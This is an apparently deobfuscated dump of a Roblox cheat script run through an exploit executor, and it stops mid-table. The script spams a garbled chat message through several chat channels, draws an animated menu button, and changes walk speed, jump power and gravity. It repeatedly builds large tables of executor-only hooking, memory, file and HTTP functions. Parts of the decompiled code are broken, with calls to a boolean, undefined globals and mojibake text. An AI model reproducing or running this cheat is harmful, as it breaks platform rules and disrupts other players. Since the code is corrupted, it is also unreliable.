-- Lynd Deobfuscator & Dumper | https://discord.gg/SRvRc2XF6s
-- processed in 15700ms

local function runProtected()
    local function Callback()
        game.Players.LocalPlayer:Chat("æå¼ºæåºæªäººåä¼æ¯æ°¸è¿æå¼ºçð")
    end
    local function Handler()
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("æå¼ºæåºæªäººåä¼æ¯æ°¸è¿æå¼ºçð", "All")
    end
    local function Action()
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("æå¼ºæåºæªäººåä¼æ¯æ°¸è¿æå¼ºç")
    end
    task.wait(1)
    pcall(Callback)
    pcall(Handler)
    pcall(Action)
end

local Result
local function getValue2()
    local State
    if not isfolder("ChickenBeachChickenTech_Data") then
        makefolder("ChickenBeachChickenTech_Data")
        State = 0
        if isfile("ChickenBeachChickenTech_Data/background_index.txt") then
            State = tonumber(readfile("ChickenBeachChickenTech_Data/background_index.txt"), "ChickenBeachChickenTech_Data/background_index.txt", nil)
        end
    else
        State = 0
        if isfile("ChickenBeachChickenTech_Data/background_index.txt") then
            State = tonumber(readfile("ChickenBeachChickenTech_Data/background_index.txt"))
        end
    end
    writefile("ChickenBeachChickenTech_Data/background_index.txt", tostring((State + 1) % #Result))
    return Result[State + 1]
end

local function callback()
end

local function CallbackHandler()
end

local Item
local function Routine()
    Item:CaptureController()
    Item:ClickButton2(Vector2.new(0, 0))
end

local Startergui
local function createFlowBorder(Value)
    local Main, UIStroke, UIGradient
    if not Value or not Value.UIElements then

        (not Value)(1)
        return nil
    else
        Main = Value.UIElements.Main
        if not Main then
            return nil
        else
            Main:FindFirstChild("FlowBorder")
            UIStroke = Instance.new("UIStroke")
            UIStroke.Name = "FlowBorder"
            UIStroke.Thickness = 1.7
            UIStroke.Color = Color3.new(1, 1, 1)
            UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            UIStroke.LineJoinMode = Enum.LineJoinMode.Round
            UIStroke.Enabled = true
            UIStroke.Parent = Main
            UIGradient = Instance.new("UIGradient")
            UIGradient.Name = "StreamEffect"
            UIGradient.Color = Startergui
            UIGradient.Rotation = 0
            UIGradient.Parent = UIStroke
            return UIStroke
        end
    end
end

local Sendnotification
local function Worker(Data)
    local UIElements, StreamEffect, Flowborder
    local function Instance2()
        if not UIElements or UIElements.Parent == nil then
            Flowborder:Disconnect()
        else
            StreamEffect.Rotation = 161.83334350585938
        end
    end
    local Main2 = not Data
    if not Main2 then
        UIElements = Data.UIElements
        Main2 = not UIElements
    end
    if Main2 then
        return nil
    else
        Main2 = Data.UIElements.Main
        UIElements = not Main2
        if UIElements then
            UIElements = nil
            return nil
        else
            Flowborder = "FlowBorder"
            StreamEffect = Main2
            UIElements = Main2:FindFirstChild("FlowBorder")
            StreamEffect = not UIElements
            if StreamEffect then
                StreamEffect = nil
                return nil
            else
                Flowborder = UIElements
                StreamEffect = UIElements:FindFirstChild("StreamEffect")
                Flowborder = not StreamEffect
                if Flowborder then
                    Flowborder = nil
                    return nil
                else
                    Flowborder = nil
                    Flowborder = game:GetService("RunService").Heartbeat:Connect(Instance2)
                    Sendnotification = Flowborder
                    return Flowborder
                end
            end
        end
    end
end

local SetCore, Primary, Entry
local function Runner()
    task.wait(0.5)
    local Ref = Primary(SetCore)
    if Ref then
        Entry(SetCore)
        return Ref
    else
        return
    end
end

local function Executor()
    local Node = 3
    local fromHSV = Color3.fromHSV(0.008333333333333333, 1, 1)
    local HSV2 = Color3.fromHSV(0.175, 1, 1)
    local Chunk = {Title = "æå¼å¶ä½èæ¬(çª)", Icon = "crown"}
    Chunk.CornerRadius = UDim.new(0, 16)
    Chunk.StrokeThickness = 2
    Chunk.OnlyMobile = false
    Chunk.Enabled = true
    Chunk.Draggable = true
    Chunk.Active = true
    Chunk.Color = ColorSequence.new(fromHSV, HSV2)
    Chunk.Draggable = true
    SetCore:EditOpenButton(Chunk)
    local Record = {}
    while true do
        task.wait(0)
        Node = Node + 3
        if 360 >= Node then
            fromHSV = Color3.fromHSV(Node / 360, 1, 1)
            HSV2 = Color3.fromHSV((Node + 60) / 360, 1, 1)
            Chunk = Record
            Record.Title = "æå¼å¶ä½èæ¬(çª)"
            Record.Icon = "crown"
            Record.CornerRadius = UDim.new(0, 16)
            Chunk.StrokeThickness = 2
            Chunk.OnlyMobile = false
            Chunk.Enabled = true
            Chunk.Draggable = true
            Chunk.Active = true
            Chunk.Color = ColorSequence.new(fromHSV, HSV2)
            Chunk.Draggable = true
            SetCore:EditOpenButton(Chunk)
            continue
        end
        Node = 0
        fromHSV = Color3.fromHSV(0, 1, 1)
        HSV2 = Color3.fromHSV(0.16666666666666666, 1, 1)
        Chunk = Record
        Record.Title = "æå¼å¶ä½èæ¬(çª)"
        Record.Icon = "crown"
        Record.CornerRadius = UDim.new(0, 16)
        Chunk.StrokeThickness = 2
        Chunk.OnlyMobile = false
        Chunk.Enabled = true
        Chunk.Draggable = true
        Chunk.Active = true
        Chunk.Color = ColorSequence.new(fromHSV, HSV2)
        Chunk.Draggable = true
        SetCore:EditOpenButton(Chunk)
    end
end

local function Processor(walkSpeedEnabled)
    local Holder = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Holder._G = Holder
    Holder.WalkSpeedEnabled = walkSpeedEnabled
    local Character, Humanoid
    if not walkSpeedEnabled then
        Character = game.Players.LocalPlayer.Character
        if Character then
            Humanoid = Character:FindFirstChild("Humanoid")
            if Humanoid then
                Humanoid.WalkSpeed = 16
            end
        end
    end
end

local function Listener(Input, ...)
    x1.WalkSpeedValue = Input
    local Character2, Humanoid2
    if getgenv(select(3, ...)).WalkSpeedEnabled then
        Character2 = game.Players.LocalPlayer.Character
        if Character2 then
            Humanoid2 = Character2:FindFirstChild("Humanoid")
            if Humanoid2 then
                Humanoid2.WalkSpeed = Input
            end
        end
    end
end

local function waitForChild(Param)
    local WalkSpeedValueor16 = x1
    local WalkSpeedEnabled = x1.WalkSpeedEnabled
    local Instance3
    if WalkSpeedEnabled then
        WalkSpeedEnabled = Param:WaitForChild("Humanoid")
        Instance3 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Instance3._G = Instance3
        WalkSpeedValueor16 = Instance3.WalkSpeedValue or 16
        WalkSpeedEnabled.WalkSpeed = WalkSpeedValueor16
        return Param, WalkSpeedEnabled, WalkSpeedValueor16, Instance3
    else
        return Param, WalkSpeedEnabled, WalkSpeedValueor16
    end
end

local function Resolver(jumpPowerEnabled)
    local Container = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Container._G = Container
    Container.JumpPowerEnabled = jumpPowerEnabled
    local Character3, Humanoid3
    if not jumpPowerEnabled then
        Character3 = game.Players.LocalPlayer.Character
        if Character3 then
            Humanoid3 = Character3:FindFirstChild("Humanoid")
            if Humanoid3 then
                Humanoid3.UseJumpPower = true
                Humanoid3.JumpPower = 50
            end
        end
    end
end

local function Dispatcher(Source, ...)
    x2.JumpPowerValue = Source
    local Character4, Humanoid4
    if getgenv(select(3, ...)).JumpPowerEnabled then
        Character4 = game.Players.LocalPlayer.Character
        if Character4 then
            Humanoid4 = Character4:FindFirstChild("Humanoid")
            if Humanoid4 then
                Humanoid4.UseJumpPower = true
                Humanoid4.JumpPower = Source
            end
        end
    end
end

local function Instance4(Target)
    local JumpPowerValueor50 = x2
    local JumpPowerEnabled = x2.JumpPowerEnabled
    local Instance5
    if JumpPowerEnabled then
        JumpPowerEnabled = Target:WaitForChild("Humanoid")
        JumpPowerEnabled.UseJumpPower = true
        Instance5 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Instance5._G = Instance5
        JumpPowerValueor50 = Instance5.JumpPowerValue or 50
        JumpPowerEnabled.JumpPower = JumpPowerValueor50
        return Target, JumpPowerEnabled, JumpPowerValueor50, Instance5
    else
        return Target, JumpPowerEnabled, JumpPowerValueor50
    end
end

local function Task(gravityEnabled)
    local Wrapper = {
    print = print,
    type = type,
    tostring = tostring,
    tonumber = tonumber,
    next = next,
    pairs = pairs,
    ipairs = ipairs,
    select = select,
    rawget = rawget,
    rawset = rawset,
    rawequal = rawequal,
    rawlen = rawlen,
    setmetatable = setmetatable,
    getmetatable = getmetatable,
    assert = assert,
    error = error,
    pcall = pcall,
    xpcall = xpcall,
    unpack = unpack,
    getfenv = getfenv,
    setfenv = setfenv,
    collectgarbage = collectgarbage,
    gcinfo = gcinfo,
    newproxy = newproxy,
    require = require,
    load = load,
    loadstring = load,
    _VERSION = "Lua 5.1",
    string = string,
    table = table,
    math = math,
    bit32 = bit32,
    bit = bit32,
    os = os,
    io = io,
    utf8 = utf8,
    debug = debug,
    coroutine = coroutine,
    buffer = buffer,
    game = game,
    Game = game,
    workspace = workspace,
    Workspace = workspace,
    script = script,
    shared = shared,
    plugin = plugin,
    Instance = Instance,
    Vector2 = Vector2,
    Vector3 = Vector3,
    Vector2int16 = Vector2int16,
    Vector3int16 = Vector3int16,
    CFrame = CFrame,
    Color3 = Color3,
    UDim = UDim,
    UDim2 = UDim2,
    Rect = Rect,
    Region3 = Region3,
    Ray = Ray,
    NumberRange = NumberRange,
    NumberSequence = NumberSequence,
    NumberSequenceKeypoint = NumberSequenceKeypoint,
    ColorSequence = ColorSequence,
    ColorSequenceKeypoint = ColorSequenceKeypoint,
    BrickColor = BrickColor,
    TweenInfo = TweenInfo,
    PhysicalProperties = PhysicalProperties,
    Faces = Faces,
    Axes = Axes,
    Random = Random,
    DateTime = DateTime,
    Font = Font,
    OverlapParams = OverlapParams,
    RaycastParams = RaycastParams,
    Enum = Enum,
    wait = wait,
    tick = tick,
    time = time,
    elapsedTime = elapsedTime,
    typeof = typeof,
    warn = warn,
    spawn = spawn,
    delay = delay,
    task = task,
    getgenv = getgenv,
    getrenv = getrenv,
    getsenv = getsenv,
    getreg = getreg,
    getgc = getgc,
    getloadedmodules = getloadedmodules,
    getinstances = getinstances,
    getnilinstances = getnilinstances,
    getscripts = getscripts,
    getconnections = getconnections,
    getrunningscripts = getrunningscripts,
    getcallingscript = getcallingscript,
    gethui = gethui,
    getthreadidentity = getthreadidentity,
    setthreadidentity = setthreadidentity,
    checkcaller = checkcaller,
    islclosure = islclosure,
    iscclosure = iscclosure,
    isourclosure = isourclosure,
    is_synapse_function = is_synapse_function,
    clonefunction = clonefunction,
    cloneref = cloneref,
    compareinstances = compareinstances,
    newcclosure = newcclosure,
    hookfunction = hookfunction,
    replaceclosure = replaceclosure,
    hookmetamethod = hookmetamethod,
    getrawmetatable = getrawmetatable,
    setrawmetatable = setrawmetatable,
    setreadonly = setreadonly,
    isreadonly = isreadonly,
    make_writeable = make_writeable,
    make_readonly = make_readonly,
    identifyexecutor = identifyexecutor,
    getexecutorname = getexecutorname,
    setclipboard = setclipboard,
    toclipboard = toclipboard,
    setfpscap = setfpscap,
    firetouchinterest = firetouchinterest,
    fireclickdetector = fireclickdetector,
    fireproximityprompt = fireproximityprompt,
    keypress = keypress,
    keyrelease = keyrelease,
    mouse1click = mouse1click,
    mouse1press = mouse1press,
    mouse1release = mouse1release,
    mousemoverel = mousemoverel,
    queue_on_teleport = queue_on_teleport,
    saveinstance = saveinstance,
    decompile = decompile,
    getscriptclosure = getscriptclosure,
    getfunctionhash = getfunctionhash,
    getcustomasset = getcustomasset,
    rconsoleprint = rconsoleprint,
    rconsolename = rconsolename,
    rconsoleclear = rconsoleclear,
    setfflag = setfflag,
    protectgui = protectgui,
    unprotectgui = unprotectgui,
    sethiddenproperty = sethiddenproperty,
    gethiddenproperty = gethiddenproperty,
    isnetworkowner = isnetworkowner,
    isfile = isfile,
    isfolder = isfolder,
    makefolder = makefolder,
    delfile = delfile,
    delfolder = delfolder,
    listfiles = listfiles,
    readfile = readfile,
    writefile = writefile,
    appendfile = appendfile,
    loadfile = loadfile,
    dofile = dofile,
    request = request,
    http_request = request,
    crypt = crypt,
    base64_encode = base64_encode,
    base64_decode = base64_decode,
    base64encode = base64_encode,
    base64decode = base64_decode,
    syn = syn,
    WebSocket = WebSocket,
    Drawing = Drawing,
    DrawingImmediate = Drawing,
    }
    Wrapper._G = Wrapper
    Wrapper.GravityEnabled = gravityEnabled
    if not gravityEnabled then
        workspace.Gravity = 196.2
    end
end

local function Job(Info, ...)
    local Buffer = tonumber(Info)
    local Cache
    if Buffer then
        Cache = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
